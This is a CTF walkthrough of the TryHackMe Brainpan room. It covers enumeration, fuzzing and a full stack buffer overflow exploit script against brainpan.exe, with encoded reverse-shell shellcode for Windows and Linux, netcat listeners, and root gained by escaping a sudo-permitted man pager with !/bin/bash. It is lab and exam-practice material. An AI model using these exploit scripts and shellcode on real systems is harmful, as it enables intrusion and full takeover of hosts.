#CTF #THM

The mo today seems to indicate that we have a windows box where we need to get in and download a windows executable file, and then test it for overflows on a linux box.

I am just assuming we need to install wine with ollydbg or something locally on kali.

There are not many other hints.

Task1 - Deploy and compromise the machine
---------------------------------------------------------------------

Doing a port scan I see:

```
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.33.75
------------------------------------------------------------
Scanning target 10.10.33.75
Time started: 2022-11-02 08:42:52.223253
------------------------------------------------------------
Port 9999 is open
Port 10000 is open
Port scan completed in 0:01:29.313794
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.33.75 10.10.33.75
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.33.75 10.10.33.75
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 08:46 JST
Nmap scan report for 10.10.33.75
Host is up (0.27s latency).

PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.93%I=7%D=11/2%Time=6361AFC6%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.97 seconds
------------------------------------------------------------
Combined scan completed in 0:04:09.212352
Press enter to quit...

```

So we have an abyss server running on 9999/tcp which we will need to exploit, and a simple Python webserver running on 10000/tcp which I assume is where we will need to get their .exe from.

```
┌──(kali㉿kali)-[~]
└─$ nc brainpan 9999     
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> brainpan
                          ACCESS DENIED
                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ nc brainpan 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> " or ""="
                          ACCESS DENIED

```

Ok tried to login and try some simple sqli injection.

Time to check out the other port.

Looks like the only thing being hosted on that page visibly is a very simple webpage showing safe coding stuff.

```
┌──(kali㉿kali)-[~]
└─$ curl -vv http://brainpan.thm:10000/
*   Trying 10.10.33.75:10000...
* Connected to brainpan.thm (10.10.33.75) port 10000 (#0)
> GET / HTTP/1.1
> Host: brainpan.thm:10000
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: SimpleHTTP/0.6 Python/2.7.3
< Date: Wed, 02 Nov 2022 00:09:26 GMT
< Content-type: text/html
< Content-Length: 215
< Last-Modified: Mon, 04 Mar 2013 17:35:55 GMT
< 
<html>
<body bgcolor="ffffff">
<center>
<!-- infographic from http://www.veracode.com/blog/2012/03/safe-coding-and-software-security-infographic/ -->
<img src="soss-infographic-final.png">
</center>
</body>
</html>
* Closing connection 0

```

I don't see any javascript or anything to take advantage of here. It is possible something else is being hosted in that directory where the Python simple http server is being run.

Let's try to enumerate and see if we can figure out if there is anything else behind that webserver:

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u brainpan.thm:10000 -e -x 400,500 -r -t 100

  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                                                          
 (_||| _) (/_(_|| (_| )                                                                                                                         
                                                                                                                                                
Extensions: -x | HTTP method: GET | Threads: 100 | Wordlist size: 9481

Output File: /home/kali/reports/_brainpan.thm_10000/_22-11-02_09-17-48.txt

Target: http://brainpan.thm:10000/

[09:17:49] Starting:                                                                                                                            
[09:18:14] 301 -    0B  - /bin  ->  /bin/                                   
Added to the queue: bin/
[09:18:14] 200 -  230B  - /bin/                                             
                                                                             
[09:19:09] Starting: bin/                                                                                                                       
                                                                             
Task Completed                  
```

Ok so we have a /bin directory. 

```
┌──(kali㉿kali)-[~]
└─$ curl http://brainpan.thm:10000/bin/
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /bin/</title>
<body>
<h2>Directory listing for /bin/</h2>
<hr>
<ul>
<li><a href="brainpan.exe">brainpan.exe</a>
</ul>
<hr>
</body>
</html>

```

Nice.. so we have found brainpan.exe. 

Let's grab that:

```
┌──(kali㉿kali)-[~]
└─$ curl -O http://brainpan.thm:10000/bin/brainpan.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 21190  100 21190    0     0   9656      0  0:00:02  0:00:02 --:--:--  9658

[..]

┌──(kali㉿kali)-[~]
└─$ file brainpan.exe    
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
                                                                                                             
```

So this is a 32bit exe. You can use ollydbg but you would need to install the 32bit archetecture on kali for this.. most ppl using 64bit nowdays but you can get it with this:

```
┌──(kali㉿kali)-[~]
└─$ sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install wine32:i386
```

otherwise:

```
┌──(kali㉿kali)-[~]
└─$ sudo apt install ollydbg    
```

After getting ollydbg up and loaded brainpan.exe

I run the following code to fuzz:

```
#!/usr/bin/env python3

import socket, time, sys

ip = "127.0.0.1"

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```

Then I run it and it crashes at 600

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/brainpan]
└─$ python3 fuzzer.py    
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing crashed at 600 bytes
```

Then I create the following code to exploit:

```
import socket

ip = "127.0.0.1"
port = 9999

prefix = ""
offset = 0 
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

I made the pattern like this:

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/brainpan]
└─$ ./pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

So I run the exploit now after restarting ollydbg and find that i see something interesting in the play window for the abyss.

It says:
```
[get_reply] s = [our payload here]
[get_reply] copied 1003 bytes to buffer
```

Our current EIP is 35724134

Convert that hex to ascii: 5rA4

Searching for 5rA4.

I have not found this or its reverse A45r.

I tried to put some marker in the exploit so I set the retn variable to "BBBB" and sent the exploit again after restarting ollydbg. I noticed that one of the registers contaned 41414242. 

I decided to see if I could change the offset by hand and watch where the 42424242 hits. I put it at 512.

ESP showed now 41414242

I made it 516. Now ESP showed 42310045
however EBP had most of the 4242.
I increase it again to 516 and reset again. After running the exploit now I had 1a424242 in EIP! I add 1 more.. and ran it again.. now i have completely overwritten EIP with our retn address!

Now we just need to figure out a jmp point to put in there.

Here is the relavent part of the code I have as it stands:

```
prefix = "HAXOR "
offset = 518 
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix

```

I generateded somepayload to go ahead and change the payload using only standard badbytes.

Then stepping through the program I see call eSP for address
7b06fbb6
\xb6\xfb\x06\x7b

It didnt work, and I think it tried to jump to an invalid instruction.

I start looking through the code and find a new jmp address:
7b06fcf1
\xf1\xfc\x06\x7b

Found another issue and trying another jmp

\x00\xfd\x06\x7b

This time the entire exploit made it to the right spot and the overflow string looks correct in the play window. I now have EIP with 31171500 which is in brainpan module.

\x00\x15\x17\x31

I went back and checked and I think I am off on the offset.
NOTE (I realized later the prefix I used was throwing me off. I originally included that to help me figure out where I was landing on the registers. This is a lot more difficult using only Linux without Mona to debug)

I found this tool to find the offset:

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/brainpan]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524
```

The 35724134 comes from where the EIP points after running the exploit with 1000 bytes.

Now I change the exploit again and remove payload and make it like this:

```
prefix = ""
offset = 524 
overflow = "A" * offset
retn = "BBBB"
#padding = "\x90" * 16
padding = ""
```

Confirmed EIP is properly overwritten with 42424242 or 4 Bs

Now we search for a jmp esp and find one at 311712f3. In Ollydbg you can restart your code if needed, right click on the code lines or hex and search for command 'jmp esp'

We write that return in reverse and put it in retn variable in our script.
\xf3\x12\x17\x31

final exploit code:
```
import socket

ip = "127.0.0.1"
port = 9999

prefix = ""
offset = 524 
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = ("\xba\x6b\xb3\x85\x98\xd9\xca\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x52\x31\x50\x12\x03\x50\x12\x83\xab\xb7\x67\x6d\xd7"
"\x50\xe5\x8e\x27\xa1\x8a\x07\xc2\x90\x8a\x7c\x87\x83\x3a"
"\xf6\xc5\x2f\xb0\x5a\xfd\xa4\xb4\x72\xf2\x0d\x72\xa5\x3d"
"\x8d\x2f\x95\x5c\x0d\x32\xca\xbe\x2c\xfd\x1f\xbf\x69\xe0"
"\xd2\xed\x22\x6e\x40\x01\x46\x3a\x59\xaa\x14\xaa\xd9\x4f"
"\xec\xcd\xc8\xde\x66\x94\xca\xe1\xab\xac\x42\xf9\xa8\x89"
"\x1d\x72\x1a\x65\x9c\x52\x52\x86\x33\x9b\x5a\x75\x4d\xdc"
"\x5d\x66\x38\x14\x9e\x1b\x3b\xe3\xdc\xc7\xce\xf7\x47\x83"
"\x69\xd3\x76\x40\xef\x90\x75\x2d\x7b\xfe\x99\xb0\xa8\x75"
"\xa5\x39\x4f\x59\x2f\x79\x74\x7d\x6b\xd9\x15\x24\xd1\x8c"
"\x2a\x36\xba\x71\x8f\x3d\x57\x65\xa2\x1c\x30\x4a\x8f\x9e"
"\xc0\xc4\x98\xed\xf2\x4b\x33\x79\xbf\x04\x9d\x7e\xc0\x3e"
"\x59\x10\x3f\xc1\x9a\x39\x84\x95\xca\x51\x2d\x96\x80\xa1"
"\xd2\x43\x06\xf1\x7c\x3c\xe7\xa1\x3c\xec\x8f\xab\xb2\xd3"
"\xb0\xd4\x18\x7c\x5a\x2f\xcb\xfc\x9b\x2f\x0a\x6b\x9e\x2f"
"\x1d\x37\x17\xc9\x77\xd7\x71\x42\xe0\x4e\xd8\x18\x91\x8f"
"\xf6\x65\x91\x04\xf5\x9a\x5c\xed\x70\x88\x09\x1d\xcf\xf2"
"\x9c\x22\xe5\x9a\x43\xb0\x62\x5a\x0d\xa9\x3c\x0d\x5a\x1f"
"\x35\xdb\x76\x06\xef\xf9\x8a\xde\xc8\xb9\x50\x23\xd6\x40"
"\x14\x1f\xfc\x52\xe0\xa0\xb8\x06\xbc\xf6\x16\xf0\x7a\xa1"
"\xd8\xaa\xd4\x1e\xb3\x3a\xa0\x6c\x04\x3c\xad\xb8\xf2\xa0"
"\x1c\x15\x43\xdf\x91\xf1\x43\x98\xcf\x61\xab\x73\x54\x81"
"\x4e\x51\xa1\x2a\xd7\x30\x08\x37\xe8\xef\x4f\x4e\x6b\x05"
"\x30\xb5\x73\x6c\x35\xf1\x33\x9d\x47\x6a\xd6\xa1\xf4\x8b"
"\xf3")
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Restart ollydbg again and re-run the exploit..

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                      
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 39006
Microsoft Windows 6.1.7601

Z:\home\kali>

```

Now we try it on the real box:

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [tun0] from (UNKNOWN) [10.10.68.121] 34716
CMD Version 1.4.1

Z:\home\puck>
```

BAM!

Enumerate..

This looks like a linux box running wine.

So we made our orignial msfvenom payload for windows. We need to redo that and make a new one for linux:

```python
import socket

ip = "10.10.68.121"
port = 9999

prefix = ""
offset = 524 
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = ("\xd9\xc9\xd9\x74\x24\xf4\x5a\xbe\x98\xde\xf6\x26\x2b\xc9"
"\xb1\x12\x83\xea\xfc\x31\x72\x13\x03\xea\xcd\x14\xd3\x3b"
"\x29\x2f\xff\x68\x8e\x83\x6a\x8c\x99\xc5\xdb\xf6\x54\x85"
"\x8f\xaf\xd6\xb9\x62\xcf\x5e\xbf\x85\xa7\x6a\x2d\x75\xec"
"\x03\x53\x79\x03\x88\xda\x98\x93\x56\x8d\x0b\x80\x25\x2e"
"\x25\xc7\x87\xb1\x67\x6f\x76\x9d\xf4\x07\xee\xce\xd5\xb5"
"\x87\x99\xc9\x6b\x0b\x13\xec\x3b\xa0\xee\x6f")
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Now we have a new reverse shell with linux:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [tun0] from (UNKNOWN) [10.10.68.121] 34717

ls 
checksrv.sh
web

```

Looking around:
```
whoami
puck
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

So we can run one command with sudo. anansi_util. Checking out that command:

```
sudo /home/anansi/bin/anansi_util 
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

Ok so we just run this tool with the manual option since it relies on an option we can play around with that. 

I want to stablize this shell first:

```
which python
/usr/bin/python
/usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

```


```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional
!/bin/bashRETURN)
root@brainpan:/usr/share/man# id
uid=0(root) gid=0(root) groups=0(root)
```

So this tool basically just has the user wait inside this root enabled tool since it was initiated with sudo. Its easy to break out of these by just forcing a shell with !/bin/bash as above.

Enumerating for the root flag. 

```
root@brainpan:/usr/share/man# ls
cs  de.UTF-8  fr        hu  ja    man2  man5  man8  pl.UTF-8  ru  tr
da  es        fr.UTF-8  id  ko    man3  man6  nl    pt        sl  zh_CN
de  fi        gl        it  man1  man4  man7  pl    pt_BR     sv  zh_TW
root@brainpan:/usr/share/man# cd /root
root@brainpan:~# ls
b.txt
root@brainpan:~# cat b.txt
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 



root@brainpan:~# 

```

Conclusion:
-----------------------

I think this room was one of the harder ones for sure. I learned some key stuff regarding debugs specifically after stumbing around so many times in the beginning, and then looking around for some tool to do that in linux, I found that nice  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb command. That made it so much easier. I was so close with my own guess based on the input but a little off is too much. I also found /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <len> so I can use that incase I dont have my ruby script -- very useful!

I think the main issue was just getting the exploit down for the .exe as practice for the OSCP exam. I was a little confused when I saw the DOS style formating on the windows machine and it hit me that it was wine. I got nervous having to make a new shell code thinking I would have to restart the victim machine in THM, but it worked fine.  

Getting root was pretty easy (thankfully)

